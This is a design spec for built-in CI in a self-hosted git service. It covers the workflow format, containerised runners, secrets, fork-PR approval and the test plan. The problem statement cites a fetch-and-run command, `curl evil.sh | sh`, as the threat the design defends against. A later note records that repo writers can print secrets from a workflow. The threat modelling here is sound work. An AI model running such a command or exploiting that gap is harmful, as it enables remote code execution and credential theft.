# Built-in CI: workflows, runs and runners (ROADMAP 18.1–18.3)

Created: 2026-11-06
Category: enhancement
Status: ready-for-agent

Research and the comparison behind these decisions: `research.md`. Mock: `mockups/actions.html`,
`actions_run.html`, `pr_checks.html`, `repo_settings_ci.html`, `admin_runners.html` (reworked by ticket 01). Parent ticket: `../2026-11-06-uiux-desktop-9.5/issues/18-ci-pipelines.md`.

## Problem Statement

A Repository can only show CI results that an outside system posts as commit statuses. A team that wants tests to run on
every push has to host Jenkins, GitLab or GitHub Actions elsewhere, wire a token into it, and read results on a
different site. ROADMAP 18.1–18.3 promises built-in CI and has no design: no workflow format, no answer to where
untrusted code runs, and no UI. Running a stranger's `curl evil.sh | sh` on the Instance host would hand over the
database DSN and `security.secret_key`, so "just run the commands" is not an option.

## Solution

A Repository gets an **Actions** tab. A **Workflow** is a YAML file under `.cloudzilla/workflows/` in the GitHub-Actions
syntax subset, so an existing `.github/workflows/ci.yml` of shell steps can be copied over. A push, a pull request or a
manual click creates a **Run**. **Jobs** are claimed by **Runners**: separate `cz-runner` processes, registered by token,
that execute each Job in a non-privileged Docker container. Nothing from a Workflow ever runs inside the server process.
Each Job posts a commit status, so branch protection's required checks work for built-in and external CI alike. The Run
page streams logs while a Job runs; artifacts are downloadable. Pull requests from forks wait for a writer's approval and
run with no secrets and a read-only token.

## User Stories

1. As a repo writer, I want to add a YAML file under `.cloudzilla/workflows/` and see it run on my next push, so that I
   get CI without hosting another service
2. As a repo writer, I want to copy a simple GitHub workflow of `run:` steps and have it work, so that I don't relearn a
   format
3. As a repo writer, I want a clear error naming the file, line and key when a workflow uses `uses:` or services, so
   that I know what v1 doesn't support
4. As a repo writer, I want a workflow with a YAML mistake to show as a failed run with the parse message, so that I
   find the typo without reading server logs
5. As a repo writer, I want `on: push` with `branches` and `tags` filters, so that only relevant pushes run
6. As a repo writer, I want `on: pull_request` to run for opened, reopened and updated PRs, so that a PR shows its
   results before merge
7. As a repo writer, I want `workflow_dispatch` and a "Run workflow" button with a ref picker, so that I can run a
   workflow by hand
8. As a repo writer, I want several workflow files that run independently, so that lint, test and release are separate
9. As a repo writer, I want Jobs that `needs` other Jobs, so that deploy waits for test
10. As a repo writer, I want a Job skipped when `if:` is false, so that I can run cleanup only on failure
11. As a repo writer, I want `strategy.matrix` to fan out a Job, so that I test several versions
12. As a repo writer, I want a matrix that expands past the job limit to fail with a message, so that I notice before
    it eats the runners
13. As a repo writer, I want `env:` at workflow, job and step level, so that I can configure commands
14. As a repo writer, I want `timeout-minutes` on a Job, so that a hung build is killed
15. As a repo writer, I want `concurrency` with `cancel-in-progress`, so that a new push stops the stale run
16. As a repo writer, I want `container: <image>` on a Job, so that I get the toolchain I need
17. As a repo writer, I want a job-level `artifacts:` list, so that build outputs can be downloaded after the Job
18. As a repo writer, I want the repo checked out at the run's commit before step 1, so that I don't write a checkout
    step
19. As a repo writer, I want the checked-out commit of a pull request to be its head commit, so that I test what the
    author pushed
20. As a repo reader, I want a runs list with status, workflow, run number, trigger, branch, commit, duration and
    actor, so that I see CI health at a glance
21. As a repo reader, I want to filter runs by workflow, branch, status and trigger, so that I find the one I need
22. As a repo reader, I want a run page with a job graph, steps and per-step logs, so that I can see which step failed
23. As a repo reader, I want logs that stream while a Job runs, so that I don't refresh to see progress
24. As a repo reader, I want line anchors, a timestamps toggle and log search, so that I can share and find lines
25. As a repo reader, I want to download a Job's log and its artifacts, so that I can inspect them offline
26. As a repo reader on a private repo, I want logs and artifacts hidden from non-readers with the same 404 as a missing
    repo, so that CI doesn't leak the repo
27. As a repo writer, I want to cancel a queued or running Run, so that I free the runners
28. As a repo writer, I want to re-run all Jobs or only failed Jobs, so that a flaky step doesn't need a new commit
29. As a repo writer, I want a Job that lost its runner to read "runner lost", not hang, so that the Run ends
30. As a pull request author, I want a PR's Checks tab to group built-in Jobs under their Run with a link to the run, so
    that I can open the log of a failing check
31. As a pull request author, I want built-in Jobs and external CI statuses in one list, so that I see every check
32. As a maintainer, I want branch protection's required checks to accept `ci/<job>`, so that merges wait for built-in
    CI
33. As a maintainer, I want a workflow with a YAML error to post one failing status, so that a broken workflow can't be
    merged around
34. As a maintainer, I want fork pull requests to wait as "Approval required", so that a stranger can't run code on my
    runners
35. As a maintainer, I want to approve a fork run after reading its workflow file, so that I choose what runs
36. As a maintainer, I want every new push to a fork PR to need approval again, so that approval of v1 doesn't cover v2
37. As a maintainer, I want fork runs to get no secrets and a read-only token, so that a PR can't steal deploy keys
38. As a repo admin, I want to store repo secrets that are write-only, so that nobody reads them back from the UI
39. As a repo admin, I want secrets masked in logs, including base64 and URL-encoded forms, so that an echo doesn't
    leak them
40. As a repo admin, I want to register a repo runner with a one-time token, so that my repo has its own build host
41. As a superadmin, I want to register instance runners and see their labels, status and last contact, so that I manage
    capacity
42. As a runner operator, I want a runner behind NAT to work with only outbound HTTPS, so that I don't open inbound
    ports
43. As a runner operator, I want containers started with no privileges, dropped capabilities, a non-root user, and
    CPU, memory and PID limits, so that a hostile Job can't harm the host
44. As a runner operator, I want an allowed-images list, so that only vetted images run
45. As a runner operator, I want to revoke a runner and have its token stop working at once, so that a stolen host is
    cut off
46. As a repo admin, I want a Settings → CI/CD section to turn CI off for a repo while keeping history, so that I can
    pause it
47. As a repo admin, I want an empty state that says "no runners registered" with a link, so that I know why Jobs wait
48. As a superadmin, I want `ci.enabled` to hide the whole feature, so that an Instance that never wants CI sees none of
    it
49. As a superadmin, I want limits on queued runs, concurrent runs, jobs per run, log size and retention, so that one
    repo can't starve the Instance
50. As an integrator, I want a `workflow_run` webhook when a Run completes, so that external systems react
51. As an integrator, I want JSON endpoints to list runs, read a run, read logs by offset, cancel, re-run and dispatch,
    so that scripts can drive CI
52. As a contributor browsing commits, I want a status icon on the commit list, the PR header and the file tree's last
    commit row, so that I see whether a commit passed
53. As a repo reader, I want `/{owner}/{repo}/checks` to still resolve, so that old links work
54. As a repo reader, I want external commit statuses reachable as a filter on the Actions tab, so that nothing I saw on
    the old Checks page is lost
55. As a self-hoster, I want old logs and artifacts to expire after a configurable period, so that storage doesn't grow
    forever
56. As a repo owner who renames or transfers a repo, I want runs, secrets and runners to follow it, so that CI keeps
    working

## Implementation Decisions

Vocabulary is in `GLOSSARY.md` (Workflow, Run, Job, Step, Runner, Artifact). "Pipeline" is retired from the UI, docs
and code; ROADMAP 18.1–18.3 is renamed to match.

**Security model (ADR 0003).** Workflow code runs only on a Runner, in a container, never in the server process and never
with the Instance's credentials. The server has no Docker access. A Runner polls the server over outbound HTTPS; the
server never connects to a Runner.

**Format (ADR 0004).** A GitHub-Actions syntax subset in `.cloudzilla/workflows/*.yml|yaml`, up to 20 files per repo.
Supported keys: `name`, `on` (`push` with `branches` and `tags`, `pull_request` with types `opened`, `reopened`,
`synchronize`, `workflow_dispatch` with a ref and no inputs), `env`, `concurrency` (`group`, `cancel-in-progress`),
`jobs.<id>` with `name`, `runs-on`, `needs`, `if`, `env`, `container` (image string), `timeout-minutes`,
`strategy.matrix` (axes, `include`, `exclude`, `fail-fast`), `steps` (`name`, `run`, `env`, `if`, `timeout-minutes`,
`working-directory`, `shell` of `sh` or `bash`) and the one deliberate extension, job-level
`artifacts: [{name, path}]`. Not supported and rejected at parse time with file, line and key: `uses`, `services`,
`schedule`, `paths` filters, `pull_request_target`, `permissions`, `outputs`, `environment`, `defaults`, reusable
workflows. Unknown keys are errors, not ignored, so a user is never told a green run proves something it skipped.

**Expressions.** `${{ }}` and `if:` accept contexts `github` (`sha`, `ref`, `ref_name`, `event_name`, `actor`,
`repository`, `run_number`), `env`, `secrets`, `matrix` and `needs.<id>.result`; functions `success()`, `failure()`,
`always()`, `cancelled()`, `contains`, `startsWith`, `endsWith`, `format`; operators `==`, `!=`, `&&`, `||`, `!`.
Anything else fails the parse. Expansion of `secrets` happens on the runner, never on the server.

**Limits** (all `ci.*` config, defaults): 50 Jobs per Run after matrix expansion, 200 Steps per Run, 20 queued Runs per
repo (the oldest `queued` Run is cancelled when a new one arrives), 5 concurrent Runs per repo, a Job queued over 24 h
cancelled as "no runner", Job timeout 60 minutes by default and at most `ci.max_job_minutes` (360), 20 MiB of log per Job
then a truncation line, 100 MiB per Artifact and 10 per Run, and 30-day retention for logs and artifacts
(`ci.log_retention`, `ci.artifact_retention`). Run rows and commit statuses are kept.

**Data model.** Tables for Runs (per-repo number, workflow path and name, event, ref, SHA, pull request, attempt,
status, trigger user, timestamps, cancelled-by), Jobs (name, matrix values, needs, runner label, container image,
status, runner, lease and heartbeat times, timeout), Steps (name, status, timings, log line range), Artifacts (name,
size, SHA-256, storage key, expiry), log chunks (job, sequence, line offsets, storage key), Runners (scope of Instance
or Repository, labels, hashed token, last contact, revoked), registration tokens (hashed, one-time), and repo secrets
(sealed). Run statuses: `waiting` (fork approval), `queued`, `running`, `success`, `failure`, `cancelled`; Jobs add
`skipped`. `commit_statuses` gains a nullable `run_id`. A Run records its workflow file contents so a re-run at the same
SHA uses the same file. Migration numbers: take the next free one when each ticket starts (136 as of the spec).

**Run creation.** Created from the push path's after-push hook, from pull request open/reopen/update events, and from
the dispatch endpoint. A push that only deletes refs creates none. Workflow files are read from the pushed commit (for
pull requests, the head commit); a fork PR's files are stored but not executed until approved. A parse error creates a
failed Run with zero Jobs and one failing status, `ci/<workflow file stem>`. Each Job upserts a commit status
`ci/<job id>` linked to its Run; the creator is the triggering user, or the repo owner for a deploy-key push.
`concurrency` and the default new-push-cancels-queued rule are applied at creation.

**Runner protocol.** Registration trades a one-time token (Instance or repo scope) for a long-lived runner token stored
hashed; revoking it takes effect on the next request. The runner long-polls a claim endpoint with its labels, receives
one Job, a per-job token and the resolved Steps, and posts step status, heartbeats (every 10 s) and log chunks with
line offsets. A Job with no heartbeat for 60 s is marked `failed` with "runner lost" and its Run fails; nothing retries
automatically. A Job whose `runs-on` matches no registered label stays `queued` and the Run page names the missing
label.

**Per-job token.** Short-lived, bound to one repo and one Job, read-only, valid for git clone over HTTP and for posting
that Job's logs and artifacts, and nothing else; it dies when the Job ends. The runner clones the exact SHA into the
workspace before Step 1.

**Secrets.** Repo-scoped only. Sealed with `security.secret_key` (the same `secretbox` and per-purpose key derivation as
mirror tokens), write-only in the UI, managed by `CanManage`. With no secret key set, saving one is refused. Delivered
only to non-fork Runs and masked in logs (exact value plus base64 and URL-encoded forms). The docs state that a writer
can read a secret by pushing a workflow that prints it.

**Fork pull requests.** A PR whose head repo differs from its base repo creates a `waiting` Run. A `CanWrite` user
approves it from the Run page or the PR Checks tab; every new push makes a new Run that waits again. Approved fork Runs
get no secrets and the read-only token. A same-repo PR by a writer runs at once with secrets.

**Runner execution.** `cz-runner` shells out to the `docker` CLI (no SDK dependency). Every container: not privileged,
no host mounts, no Docker socket, `cap-drop=ALL`, `no-new-privileges`, non-root user, default 2 CPUs, 4 GiB memory and a
512 PID limit (runner flags), a per-job network, and the workspace volume removed afterwards. Runner config maps labels
to default images and may list allowed images; a refused image fails the Job with that reason. Egress filtering is the
operator's job and the docs say which ranges to block (link-local metadata and private ranges).

**Logs and artifacts.** The storage `Backend` has no append, so the runner posts chunks and each is stored as an object
with a row holding its line offsets. The page tails by offset every 2 s while a Job runs; a finished log is served by
concatenating chunks. Artifacts upload after the Job, are stored under their own key prefix and are downloaded through
the app with `CanRead` checked on every request, `Content-Disposition: attachment`, `nosniff` and a sandboxing CSP, as
release assets are. An hourly worker (the attachment sweep's pattern) deletes expired logs and artifacts, and objects
are deleted after the database change commits.

**Permissions.** View runs, logs and artifacts: `CanRead`, with the "private repo looks missing" 404. Dispatch, cancel,
re-run and approve: `CanWrite`. Secrets, runners and the CI/CD toggle: `CanManage`. Instance runners and CI limits:
superadmin at `/admin/runners`. A repo made private or soft-deleted stops serving logs and creating Runs. An archived repository creates no Runs, but its
logs and artifacts stay readable.

**Switches.** `ci.enabled` (default true) hides the tab, routes and workers when off. A per-repo CI/CD toggle (default
on) stops new Runs and keeps history.

**UI and routes.** Actions tab at the repo's `/actions` and `/actions/runs/{n}`, with Cancel, Re-run (all or failed),
Run workflow, Approve, the stage graph, collapsible steps with line anchors, timestamps toggle, log search and download.
The old `/checks` route redirects to `/actions`; the "Commit statuses" view moves behind a filter there. The PR Checks
tab groups built-in Jobs under their Run. A status icon linking to the latest Run appears on the commit list, the PR
header and the file tree's last-commit row, built from the combined commit status. New statuses `queued`, `waiting`,
`cancelled` and `skipped` get icons through one shared status-icon component.

**Webhooks and API.** New `workflow_run` webhook event, off by default for existing hooks, fired on completion with run,
workflow, conclusion, SHA, branch and URL. JSON endpoints under the repo's `/api` namespace for list, get, logs by
offset, cancel, re-run and dispatch, needing the `repo` scope to read and `repo:write` to act. The `cz` CLI gets nothing
in v1.

**Packaging.** `cz-runner` is a second binary in the same module, built with the server. It ships as a binary with
docs; the server's Docker image has no runner and no Docker access. A dev-only compose profile runs a runner against the
host Docker socket for verification.

**Failure handling.** Rows are written before objects are published where a row can be rolled back, and objects are
deleted after the commit; a failed object delete is logged and leaves an orphan that is safe to delete.

## Testing Decisions

A good test checks behaviour a user or a runner can observe: a status, a page, a response, the exact `docker` arguments.
It does not assert on private functions or query text.

Four seams, agreed with the user:

1. **Workflow parser** (a pure package): YAML in, a validated Workflow or a line-numbered error out. Table tests cover
   every supported key, every rejected key with its message, matrix expansion and the limits, and the expression
   grammar including the rejected constructs. No database.
2. **Router with a real database**, following the router tests' existing verification-router pattern: a push made with
   the test push client creates Runs; a fake runner drives the runner API through registration, claim, heartbeat, log
   chunks and finish; the test asserts pages, API responses, commit statuses, branch-protection effect, permissions
   (including private-repo 404s), fork approval, secrets withheld from fork Runs, runner-lost, cancel, re-run and
   retention. This is the main seam; most behaviour is proven here.
3. **`cz-runner` against a stub `docker` binary** on `PATH` (the pattern of the stand-in `pg_dump` scripts): assert the
   exact arguments of every container start, that none of the workflow's keys can loosen them, and that an image outside
   the allow-list is refused.
4. **Local only, outside CI**: one real run through real Docker on a throwaway server (scratch Postgres, unique
   `CZ_AUTH_COOKIE_NAME`, admin@example.test / cloudzilla-seed) covering success, failure, a matrix, an artifact,
   cancel and a fork-approval run. Evidence goes in the PR.

Prior art: `internal/testutil` (push client, test database), the router tests, the secret-scanning push-protection tests
in both transports, and the stand-in tools in the backup tests. Tests that need Postgres skip in the Test job and run in
Integration. Every UI ticket is also checked at 1440 px in light and dark.

## Out of Scope

- `uses:` actions, reusable workflows, composite actions, `services`, `schedule`, `paths` filters,
  `pull_request_target`, `permissions`, job outputs and `hashFiles`
- Caches
- Org-scoped and Instance-scoped secrets; org-scoped runners
- Host (non-container) execution
- Notifications for failed Runs
- `cz run …` commands
- Windows and macOS runners, and runner autoscaling
- Mobile layouts
- Deployments and environments
- Enforcing network egress on the runner host

## Further Notes

- Tab name, reconfirmed 2026-11-13 against the alternatives "Checks" and "Pipelines": the repo tab is **Actions**. It is
  where Workflows are run and managed. The PR tab stays **Checks** because it is a results view of one pull request.
  Keeping "Checks" in both places would give one name to two different pages, and "Pipelines" contradicts the Workflow
  and Run vocabulary and the GitHub-Actions-subset format.

- Tickets are in `issues/`; ticket 01 reworks the mock first (runs list moves from Checks to Actions). The build runs on
  one integration branch with one final PR, as for 16 and 17.
- `docs/ci.md` is written by the last ticket and linked from `CLAUDE.md`; the first ticket to touch the push path or
  storage updates `git-transport.md` and `storage.md` in the same PR.
- ROADMAP rows 18.1–18.3 currently describe a single `.cloudzilla-ci.yml`, `pipelines` tables and migrations 118–119;
  ticket 07 rewrites them.
- Open risk accepted: a repo writer can read repo secrets by pushing a workflow that prints them.
